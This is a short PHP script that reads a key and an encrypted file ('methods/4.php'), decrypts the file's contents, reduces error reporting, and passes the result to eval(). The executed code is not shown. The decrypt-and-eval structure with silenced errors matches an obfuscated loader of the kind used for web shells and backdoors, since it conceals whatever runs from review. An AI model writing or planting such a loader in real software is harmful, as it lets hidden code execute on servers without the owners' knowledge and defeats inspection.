<?php

include_once 'methods/encryptor6.php';

$key = file_get_contents(dirname(__FILE__).'/methods/key_file.txt');

$method = file_get_contents(dirname(__FILE__).'/methods/4.php');

$code_to_exec = decryptor6($key, $method);

error_reporting(E_ERROR | E_PARSE);

eval($code_to_exec);